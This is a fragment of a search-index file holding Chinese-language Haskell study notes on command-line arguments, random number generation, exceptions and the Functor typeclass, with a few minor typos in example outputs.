<p>\u4e0d\u9700\u8981\u8f93\u5165\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5185\u5bb9\u4e3a\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570\uff08\u4e00\u4e2a\u7531String\u7ec4\u6210\u7684\u5217\u8868\uff09\u3002\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[1:]</p>"},{"location":"cs/pl/haskell/#getprogname","title":"getProgName","text":"<p>getProgName :: IO String</p> <p>\u8fd4\u56de I/O action\uff0c\u5185\u5bb9\u4e3a\u7a0b\u5e8f\u7684\u540d\u5b57\uff0c\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[0]</p>"},{"location":"cs/pl/haskell/#randomness","title":"Randomness","text":"<p>\u548c\u968f\u673a\u6570\u6709\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 <code>System.Random</code> \u6a21\u5757\u4e2d\u3002GHCi \u542f\u52a8\u65f6\u53ef\u80fd\u4e0d\u4f1a\u5305\u542b System.Random \u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u65e0\u6cd5\u627e\u5230\u6a21\u5757\u3002\u9700\u8981\u901a\u8fc7 stack \u6253\u5f00: <pre><code>stack ghci --package random\n</code></pre></p> <p>Haskell \u8981\u6c42\u540c\u6837\u7684\u7a0b\u5e8f\u9700\u8981\u8fd0\u884c\u51fa\u540c\u6837\u7684\u7ed3\u679c\uff0c\u9664\u4e86\u7528\u5230\u4e86 I/O action\uff0c\u6240\u6709\u4f1a\u9020\u6210\u4e0d\u540c\u7ed3\u679c\u7684\u51fd\u6570\u90fd\u8981\u4ea4\u7ed9 I/O action \u6765\u5b8c\u6210</p> <p>\u90a3\u8981\u4f7f\u968f\u673a\u6570\u8131\u79bb IO \u5b58\u5728\uff0c\u5c31\u8981\u7528\u5230\u968f\u673a\u751f\u6210\u5668\uff08random generator\uff09</p> <p><code>System.Random</code> \u6a21\u5757\u63d0\u4f9b\u4e86\u51e0\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\uff1a</p>"},{"location":"cs/pl/haskell/#random","title":"random","text":"<p>random :: (Random a, RandomGen g) =&gt; g -&gt; (a, g)</p> <p>\u5176\u4e2d\u53c8\u6709\u4e24\u4e2a\u65b0\u7684 typeclass\uff0cRandom \u8868\u793a\u53ef\u4ee5\u53d6\u968f\u673a\uff0cRandomGen \u8868\u793a\u968f\u673a\u6570\u751f\u6210\u5668\u3002random \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u751f\u6210\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u4e00\u4e2a\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668</p> <p>\u83b7\u53d6\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u4ee5\u4f7f\u7528 <code>mkStdGen</code> \u51fd\u6570\uff1a</p> <p>mkStdGen :: Int -&gt; StdGen</p> <p>\u5176\u4e2d <code>StdGen</code> \u662f\u4e00\u4e2a RandomGen \u7684\u5b9e\u4f8b</p> <p>\u8fd0\u7528 random \u751f\u6210\u968f\u673a\u6570\u9700\u8981\u6307\u5b9a\u7c7b\u578b\uff0c\u4e0d\u7136\u7a0b\u5e8f\u65e0\u6cd5\u786e\u5b9a <code>a</code> \u662f\u4ec0\u4e48\u7c7b\u578b\u3002\u4f8b\u5982\uff1a <pre><code>ghci&gt; random (mkStdGen 100) :: (Int, StdGen)\n(9216477508314497915,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})\nghci&gt; random (mkStdGen 100) :: (Char, StdGen)\n('\\537310',StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})\nghci&gt; random (mkStdGen 100) :: (Bool, StdGen)\n(True,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})\n</code></pre> \u518d\u6b21\u8fd0\u884c\u540c\u6837\u7684\u51fd\u6570\uff0c\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002\u6240\u4ee5\u5982\u679c\u9700\u8981\u751f\u6210\u5176\u4ed6\u7684\u968f\u673a\u6570\uff0c\u9700\u8981\u66f4\u6362\u751f\u6210\u5668\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e00\u6b21\u8c03\u7528\u7ed3\u679c\u8fd4\u56de\u7684\u65b0\u968f\u673a\u6570\u751f\u6210\u5668\uff1a <pre><code>threeCoins :: StdGen -&gt; (Bool, Bool, Bool)  \nthreeCoins gen =   \n    let (firstCoin, newGen) = random gen  \n        (secondCoin, newGen') = random newGen  \n        (thirdCoin, newGen'') = random newGen'  \n    in  (firstCoin, secondCoin, thirdCoin) \n</code></pre></p>"},{"location":"cs/pl/haskell/#randoms","title":"randoms","text":"<p>randoms :: (Random a, RandomGen g) =&gt; g -&gt; [a]</p> <p>randoms \u63a5\u6536\u4e00\u4e2a RandomGen\uff0c\u8fd4\u56de\u4e00\u4e2a\u968f\u673a\u7684\u65e0\u7a77\u5217\u8868\u3002\u56e0\u4e3a\u5b83\u662f\u65e0\u7a77\u7684\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd4\u56de\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668</p>"},{"location":"cs/pl/haskell/#randomr","title":"randomR","text":"<p>randomR :: (Random a, RandomGen g) =&gt; (a, a) -&gt; g -&gt; (a, g)</p> <p>\u53ef\u4ee5\u7528\u6765\u751f\u6210\u6709\u8303\u56f4\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5143\u7ec4\uff0c\u8868\u793a\u751f\u6210\u968f\u673a\u6570\u7684\u8303\u56f4(\u95ed\u533a\u95f4)</p>"},{"location":"cs/pl/haskell/#randomrs","title":"randomRs","text":"<p>randomRs :: (Random a, RandomGen g) =&gt; (a, a) -&gt; g -&gt; [a]</p> <p>\u540c\u4e0a\u4e24\u4e2a\uff0c\u751f\u6210\u6709\u8303\u56f4\u7684\u65e0\u7a77\u968f\u673a\u6570\u5217\u8868</p>"},{"location":"cs/pl/haskell/#getstdgen","title":"getStdGen","text":"<p>\u5982\u679c\u60f3\u8981\u8ba9\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u5f97\u5230\u4e0d\u540c\u7684\u968f\u673a\u7ed3\u679c\uff0c\u9700\u8981\u4f7f\u7528 <code>getStdGen</code> \u6765\u83b7\u53d6\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u5b83\u4f1a\u5728\u6bcf\u6b21\u8fd0\u884c\u7684\u65f6\u5019\u4ea7\u751f\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u56e0\u6b64\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2a I/O action\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u76f4\u63a5\u7684 StdGen</p> <p>getStdGen :: Control.Monad.IO.Class.MonadIO m =&gt; m StdGen</p> <p>\u5373\u53ef\u4ee5\u770b\u6210 getStdGen :: IO StdGen\uff0c\u9700\u8981\u4f7f\u7528 &lt;- \u64cd\u4f5c\u7b26\u5c06 StdGen \u63d0\u53d6\u51fa\u6765</p> <p>\u4f46\u662f\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\uff0cgetStdGen \u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684\uff0c\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\u4e0d\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u53e6\u4e00\u4e2a\u51fd\u6570 newStdGen</p>"},{"location":"cs/pl/haskell/#newstdgen","title":"newStdGen","text":"<p>newStdGen :: Control.Monad.IO.Class.MonadIO m =&gt; m StdGen</p> <p>\u6267\u884c newStdGen \u4f1a\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a</p> <ul> <li>\u66f4\u65b0\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u4e0b\u6b21\u6267\u884c getStdGen \u4f1a\u83b7\u5f97\u4e0d\u540c\u7684\u7ed3\u679c</li> <li>\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5305\u542b\u4e00\u4e2a\u65b0\u7684 StdGen\uff08\u4f46\u662f\u8fd9\u4e2a\u751f\u6210\u5668\u548c\u5168\u5c40\u751f\u6210\u5668\u4e5f\u4e0d\u540c\uff09</li> </ul>"},{"location":"cs/pl/haskell/#exceptions","title":"Exceptions","text":"<p>\u7a0b\u5e8f\u5728\u8fd0\u884c\u5931\u8d25\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>Control.Exception</code> \u6a21\u5757\u4e2d\u7684 <code>catch</code> \u51fd\u6570\u6765\u6355\u83b7\u5f02\u5e38\uff1a</p> <p>catch :: Exception e =&gt; IO a -&gt; (e -&gt; IO a) -&gt; IO a</p> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u4ee5 IO a \u4e3a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u5f02\u5e38\u5e76\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a <pre><code>import Control.Exception\n\nmain = main' `catch` handler\n\nmain' :: IO ()\nmain' = do\n    ...\n\nhandler :: Exception e =&gt; e -&gt; IO ()\nhandler e =  putStrLn \"...\"\n</code></pre></p> <p>\u4e5f\u53ef\u4ee5\u5229\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\u548c <code>System.IO.Error</code> \u4e2d\u7684\u51fd\u6570\u6765\u5224\u65ad IO \u5f02\u5e38\u7684\u7c7b\u578b\u6765\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\uff1a <pre><code>import System.Environment\nimport System.IO.Error\nimport Control.Exception\n\nmain = toTry `catch` handler\n\ntoTry :: IO ()  \ntoTry = do (fileName:_) &lt;- getArgs  \n           contents &lt;- readFile fileName  \n           putStrLn $ \"The file has \" ++ show (length (lines contents)) ++ \" lines!\"  \n\nhandler :: IOError -&gt; IO ()  \nhandler e  \n    | isDoesNotExistError e = putStrLn \"The file doesn't exist!\"  \n    | otherwise = ioError e  \n</code></pre></p> <p>\u5177\u4f53\u76f8\u5173\u5168\u90e8\u51fd\u6570\u89c1\u6587\u6863\uff1aSystem.IO.Error\u3001Control.Exception</p>"},{"location":"cs/pl/haskell/#functors","title":"Functors","text":"<p>\u51fd\u5b50\uff08Functor\uff09\u662f\u4e00\u4e2a\u7c7b\u578b\u7c7b\uff08typeclass\uff09\uff0c\u548c\u5176\u4ed6\u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u5b83\u89c4\u5b9a\u4e86\u5176\u5b9e\u4f8b\u7c7b\u5fc5\u987b\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u4f8b\u5982 Eq \u7c7b\u578b\u7c7b\u89c4\u5b9a\u4e86\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\uff09\uff0cFunctor \u89c4\u5b9a\u7c7b\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u8fdb\u884c\u6620\u5c04\u7684\u3002Functor \u8981\u6c42\u4f7f\u7528 <code>fmap</code> :: (a -&gt; b) -&gt; f a -&gt; f b \u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a -&gt; b \u7c7b\u578b\u7684\u51fd\u6570\u3001\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50</p> <p>Functor \u53ef\u4ee5\u6bd4\u4f5c\u76d2\u5b50\uff0c\u90a3 fmap \u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\u7ed9\u5b9a\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u76d2\u5b50\uff0c\u5c06\u76d2\u5b50\u4e2d\u7684\u5168\u90e8\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u518d\u8fd4\u56de\u5e94\u7528\u51fd\u6570\u540e\u7684\u76d2\u5b50</p> <p>\u51fd\u5b50\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u4e00\u4e2a Kind \u4e3a * -&gt; * \u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u5176\u662f\u4e00\u4e2a\u76d2\u5b50\uff0c\u76d2\u5b50\u5728\u63a5\u6536\u5185\u5bb9\u540e\u624d\u4f1a\u6210\u4e3a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u3002fmap \u4e2d\u7684 <code>f a</code> \u548c <code>f b</code> \u4e5f\u662f\u56e0\u4e3a <code>f</code> \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5728\u63a5\u6536\u7c7b\u578b a/b \u540e\u624d\u4f1a\u53d8\u6210\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08f a \u548c f b\uff09\u51fa\u73b0\u5728\u51fd\u6570\u7c7b\u578b\u58f0\u660e\u4e2d</p> <p>Functor \u7684\u5b9a\u4e49\u662f: <pre><code>class Functor f where\n    fmap :: (a -&gt; b) -&gt; f a -&gt; f b\n    (&lt;$) :: a -&gt; f a -&gt; f b\n    (&lt;$) = fmap . const\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 Functor \u4e0d\u4ec5\u9700\u8981 fmap \u51fd\u6570\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a &lt;$ \u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a \u7c7b\u578b\u7684\u53d8\u91cf\u548c\u4e00\u4e2a\u5185\u5bb9\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u5bb9\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff1b\u4f5c\u7528\u5c31\u662f\u5c06\u4f20\u5165\u7684\u51fd\u5b50\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u66ff\u6362\u4e3a\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a <pre><code>ghci&gt; 'a' &lt;$ [1, 2, 3]\n\"aaa\"\n</code></pre> \u4f46\u5b83\u4e0d\u662f\u58f0\u660e\u4e00\u4e2a\u51fd\u5b50\u5b9e\u4f8b\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u4f7f\u7528 fmap \u548c const \u51fd\u6570\u590d\u5408\u6765\u5b9e\u73b0\uff0c\u5176\u4e2d const \u7684\u7c7b\u578b\u7b7e\u540d\uff1a</p> <p>const :: a -&gt; b -&gt; a</p> <p>\u5373\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u59cb\u7ec8\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570</p>"},{"location":"cs/pl/haskell/#functor","title":"Functor \u5b9e\u4f8b","text":""},{"location":"cs/pl/haskell/#_9","title":"[]","text":"<p>\u5217\u8868 [] \u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u5b83\u901a\u8fc7 map \u51fd\u6570\u6765\u5b9e\u73b0 fmap \u7684\u529f\u80fd\uff1a <pre><code>instance Functor [] where\n    fmap = map\n</code></pre></p> <p>map :: (a -&gt; b) -&gt; [a] -&gt; [b]</p> <p>map \u548c fmap \u8981\u6c42\u7684\u76f8\u540c\uff0c\u8fbe\u6210\u7684\u76ee\u7684\u4e5f\u4e00\u81f4\u3002map \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5217\u8868\uff0c\u5b83\u4f1a\u5c06\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\u540e\u518d\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868</p>"},{"location":"cs/pl/haskell/#maybe","title":"Maybe","text":"<p>Maybe \u4e5f\u5177\u6709 kind * -&gt; *\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a <pre><code>instance Functor Maybe where\n    fmap f Nothing = Nothing\n    fmap f (Just x) = Just (f x)\n\nghci&gt; fmap (*2) Nothing\nNothing\nghci&gt; fmap (*2) (Just 2)\nJust 4\n</code></pre></p>"},{"location":"cs/pl/haskell/#either-a","title":"Either a","text":"<p>Either \u7684 kind \u662f* -&gt; * -&gt; *\uff0c\u663e\u7136\u5b83\u4e0d\u662f\u51fd\u5b50\uff0c\u4f46\u662f\u56fa\u5b9a\u4e86\u4e00\u4e2a\u4f20\u5165\u7c7b\u578b\u7684 Either a \u7684 kind \u662f* -&gt; *\uff0c\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a <pre><code>instance Functor (Either a) where\n    fmap f (Left x) = Left x\n    fmap f (Right x) = Right (f x)\n\nghci&gt; fmap (*2) (Left 4)\nLeft 4\nghci&gt; fmap (*2) (Right 4)\nRight 8\n</code></pre> \u56e0\u4e3a\u4f7f\u7528 Either \u65f6\u4e00\u822c\u7528\u53f3\u503c\u8868\u793a\u6b63\u5e38\u7ed3\u679c\uff0c\u5de6\u503c\u8868\u793a\u5f02\u5e38\u4fe1\u606f\uff0c\u6240\u4ee5\u4f7f\u7528 fmap \u65f6\u53ea\u5bf9\u53f3\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u5982\u679c\u65f6\u5de6\u503c\u5219\u4fdd\u6301\u4e0d\u53d8\uff08\u800c\u4e14\u5de6\u503c\u6b64\u65f6\u4e5f\u4f5c\u4e3a\u786e\u5b9a\u7c7b\u578b\u786e\u5b9a\u503c\u5b58\u5728\uff09</p>"},{"location":"cs/pl/haskell/#io_1","title":"IO","text":"<p>IO \u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u4f7f\u7528 fmap \u5bf9 IO \u4e2d\u5185\u5bb9\u5e94\u7528\u51fd\u6570\uff1a <pre><code>instance Functor IO where\n    fmap f action = do\n        result &lt;- action\n        return (f result)\n\nghci&gt; fmap (\"input: \"++) getLine\ntest\n\"input: test\"\n</code></pre></p>"},{"location":"cs/pl/haskell/#a","title":"(,) a","text":"<p>(,) \u8868\u793a\u4e00\u4e2a\u4e8c\u5143\u7ec4\u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c(,) :: * -&gt; * -&gt; *\uff0c\u800c\u786e\u5b9a\u4e86\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u540e\u5c31\u53d8\u6210\u4e86 (,) a\uff0c\u5b83\u7684 kind \u662f * -&gt; *\u3002\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u8fdb\u884c fmap \u51fd\u6570\u65f6\u53ea\u5bf9\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5e94\u7528\uff1a <pre><code>instance Functor ((,) a) where\n    fmap f (x, y) = (x, f y)\n</code></pre> \u53ea\u5269\u4e00\u4e2a\u5143\u7d20\u7684\u4e09\u5143\u7ec4\u548c\u56db\u5143\u7ec4\u4e5f\u90fd\u662f\u51fd\u5b50\uff0cfmap \u4e5f\u53ea\u5bf9\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e94\u7528\uff1a <pre><code>instance Functor ((,,) a b) where\n    fmap f (a, b, c) = (a, b, f c)\n\ninstance Functor ((,,,) a b c) where\n    fmap f (a, b, c, d) = (a, b, c, f d)\n</code></pre></p>"},{"location":"cs/pl/haskell/#-r","title":"(-&gt;) r","text":"<p>-&gt; \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u7684 kind\uff1a</p> <p>(-&gt;) :: * -&gt; * -&gt; *</p> <p>\u4e00\u4e2a\u6620\u5c04\uff08\u4e00\u5143\u51fd\u6570\uff09\u7684\u7c7b\u578b a -&gt; b \u4e5f\u53ef\u4ee5\u5199\u6210 (-&gt;) a b\uff0c\u5b83\u662f\u7531\u7c7b\u578b a \u548c\u7c7b\u578b b \u8f93\u5165\u5230\u7c7b\u578b\u6784\u9020\u5668 -&gt; \u4e2d\u540e\u5f62\u6210\u7684\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u3002\u6240\u4ee5\u786e\u5b9a\u4e86\u8f93\u5165\u7c7b\u578b\u540e\u7684\u4e00\u5143\u51fd\u6570\u7684\u7c7b\u578b\u5c31\u662f (-&gt;) r\uff08\u5176\u4e2d <code>r</code> \u662f\u8f93\u5165\u7684\u7c7b\u578b\uff09</p> <p>\u89c4\u5b9a\u7684 fmap \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a</p> <p>fmap :: (a -&gt; b) -&gt; f a -&gt; f b</p> <p>\u5176\u4e2d\u7684 f \u662f\u51fd\u5b50\uff0c\u800c\u5728\u8fd9\u4e2a\u5b9e\u4f8b\u4e2d (-&gt;) r \u5c31\u662f\u51fd\u5b50\uff0c\u5c06\u5176\u5e26\u5165 f \u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>fmap :: (a -&gt; b) -&gt; ((-&gt; r) a) -&gt; ((-&gt; r) b)</p> <p>\u628a\u5176\u4e2d\u7684 (-&gt;) \u6362\u6210\u4e2d\u7f00\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>fmap :: (a -&gt; b) -&gt; (r -&gt; a) -&gt; (r -&gt; b)</p> <p>\u4f20\u5165\u4e24\u4e2a\u51fd\u6570\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a a -&gt; b\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a r -&gt; a\uff0c\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a r -&gt; b\u3002 \u4e0d\u96be\u63a8\u6d4b\u8fd9\u4e2a fmap \u662f\u5c06\u8fd9\u4e24\u4e2a\u51fd\u6570\u590d\u5408\u4e86\uff0c\u5148\u5bf9\u8f93\u5165\u5bf9 r \u5e94\u7528\u7b2c\u4e8c\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b a \u7684\u7ed3\u679c\uff0c\u7136\u540e\u5728\u5e94\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b b \u7684\u7ed3\u679c\uff0c\u6240\u4ee5 (-&gt;) r \u5b9a\u4e49\u7684 fmap \u662f\uff1a <pre><code>instance Functor ((-&gt;) r) where\n    fmap f g = (\\x -&gt; f (g x))\n</code></pre> \u6240\u4ee5 (-&gt;) r \u7684 fmap \u5176\u5b9e\u5c31\u662f\u51fd\u6570\u590d\u5408 (.)\uff1a <pre><code>instance Functor ((-&gt;) r) where\n    fmap = (.)\n</code></pre> <pre><code>ghci&gt; :t fmap (*3) (+100)  \nfmap (*3) (+100) :: (Num a) =&gt; a -&gt; a  \nghci&gt; fmap (*3) (+100) 1  \n303  \nghci&gt; (*3) `fmap` (+100) $ 1  \n303  \nghci&gt; (*3) . (+100) $ 1  \n303\n</code></pre></p>"},{"location":"cs/pl/haskell/#functor-laws","title":"Functor Laws","text":"<p>\u6240\u6709\u7684\u51fd\u5b50\u90fd\u5e94\u8be5\u6ee1\u8db3\u4e24\u4e2a\u5b9a\u5f8b\u3002\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\u4e0d\u662f Haskell \u5f3a\u5236\u8981\u6c42\u7684\uff0c\u4f46\u5e94\u8be5\u786e\u4fdd\u4e00\u4e2a\u51fd\u5b50\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\uff1a</p> <ol> <li><code>fmap id = id</code>\uff08\u5176\u4e2d id \u4e3a\u51fd\u6570 <code>(\\x -&gt; x)</code>\uff09\uff1a\u5373\u5bf9\u4e00\u4e2a\u51fd\u5b50 fmap id\uff0c\u90a3\u5b83\u5e94\u8be5\u8fd4\u56de\u672c\u8eab\uff08fmap id a = id a = a\uff0ca \u4e3a\u4e00\u4e2a\u51fd\u5b50\uff09\uff0c\u6bd4\u5982\uff1a     <pre><code>ghci&gt; fmap id [1, 2, 3]\n[1,2,3]\nghci&gt; fmap id (Just 2)\nJust 2\n</code></pre></li> <li><code>fmap (f . g) = fmap f . fmap g</code>\uff1a\u5373\u51fd\u5b50\u7684 fmap \u652f\u6301\u7ed3\u5408\u5f8b     fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)\uff0c\u5176\u4e2d<code>a</code>\u4e3a\u4e00\u4e2a\u51fd\u5b50     fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x))     <pre><code>ghci&gt; fmap ((*3) . (+100)) (Just 1)\nJust 303\n</code></pre></li> </ol> <p>\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u7684\u51fd\u5b50\u4e00\u5b9a\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u5b9a\u5f8b\uff0c\u6240\u4ee5\u53ea\u8981\u68c0\u67e5\u51fd\u5b50\u662f\u5426\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u5373\u53ef</p>"},{"location":"cs/pl/haskell/#intuition","title":"Intuition","text":"<p>\u5bf9\u4e8e\u51fd\u5b50\u548c fmap\uff0c\u6709\u4e24\u79cd\u7406\u89e3\u65b9\u6cd5</p> <ol> <li>\u51fd\u5b50\u662f\u4e00\u79cd\u5bb9\u5668\uff08container\uff09\uff1bfmap \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u5e94\u7528\u540e\u7684\u65b0\u5bb9\u5668</li> <li>\u51fd\u5b50\u662f\u4e00\u79cd\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff1bfmap \u662f\u67ef\u91cc\u5316\u7684\uff0c\u628a\u5176\u7c7b\u578b\u7b7e\u540d\u770b\u4f5c</li> </ol> <p>fmap :: (a -&gt; b) -&gt; (f a -&gt; f b)</p> <p>\u2003\u2003\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u4f20\u5165\u51fd\u6570 g :: a -&gt; b\uff0cfmap \u5c06\u5176\u8f6c\u6362\u4e3a\u65b0\u7684\u51fd\u6570</p> <p>fmap g :: f a -&gt; f b</p> <p>\u2003\u2003\u4f7f\u666e\u901a\u7684\u51fd\u6570 g \u53ef\u4ee5\u5728\u8ba1\u7b97\u4e0a\u4e0b\u6587 f \u4e2d\u4f7f\u7528\uff0c\u8fd9\u79cd\u8f6c\u6362\u4e5f\u88ab\u79f0\u4e3a\u63d0\u5347\uff08lift\uff09</p>"},{"location":"cs/pl/haskell/#_10","title":"\u5e38\u7528\u51fd\u6570","text":""},{"location":"cs/pl/haskell/#_11","title":"&lt;$&gt;","text":"<p><code>&lt;$&gt;</code> \u51fd\u6570\u662f <code>fmap</code> \u7684\u4e2d\u7f00\u5f62\u5f0f\uff08\u5b83\u770b\u7740\u7c7b\u4f3c <code>$</code>\uff0c<code>f $ 3</code> \u5c06 f \u5e94\u7528\u5728\u5355\u4e2a\u503c 3 \u4e0a\uff0c\u800c <code>f &lt;$&gt; [1, 2, 3]</code> \u5c06 f \u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0c\u4e5f\u5c31\u662f\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u6240\u6709\u503c\u4e0a\uff09\uff1a <pre><code>ghci&gt; fmap (*2) (Just 2)\n4\nghci&gt; (*2) &lt;$&gt; Just 2\n4\n</code></pre></p>"},{"location":"cs/pl/haskell/#_12","title":"$&gt;","text":"<p><code>$&gt;</code> \u51fd\u6570\u5305\u542b\u5728 <code>Data.Functor</code> \u6a21\u5757\u4e2d</p> <p>($&gt;) :: Functor f =&gt; f a -&gt; b -&gt; f b</p> <p>Functor \u5b9a\u4e49\u65f6\u8981\u6c42\u4e86 <code>&lt;$</code> \u51fd\u6570\uff0c\u5c06\u51fd\u5b50\u5185\u90e8\u7684\u5143\u7d20\u5168\u90e8\u66ff\u6362\u4e3a\u6307\u5b9a\u7684\u67d0\u4e2a\u503c\uff0c\u800c <code>$&gt;</code> \u6b63\u597d\u5c06 <code>&lt;$</code> \u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\u53cd\u4e86\u8fc7\u6765\uff0c\u76f8\u5f53\u4e8e <code>flip (&lt;$)</code>\uff1a <pre><code>ghci&gt; 'a' &lt;$ [1, 2, 